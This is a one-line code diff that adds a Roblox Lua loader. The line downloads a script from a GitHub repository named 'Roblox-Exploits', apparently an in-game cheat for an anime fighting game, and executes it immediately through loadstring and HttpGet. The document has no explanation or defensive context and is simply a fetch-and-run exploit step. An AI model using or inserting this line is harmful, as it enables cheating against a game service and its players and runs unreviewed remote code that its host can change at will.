@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/peer-pri/Roblox-Exploits/main/Exploits/animeenergyclashnew.lua",true))()
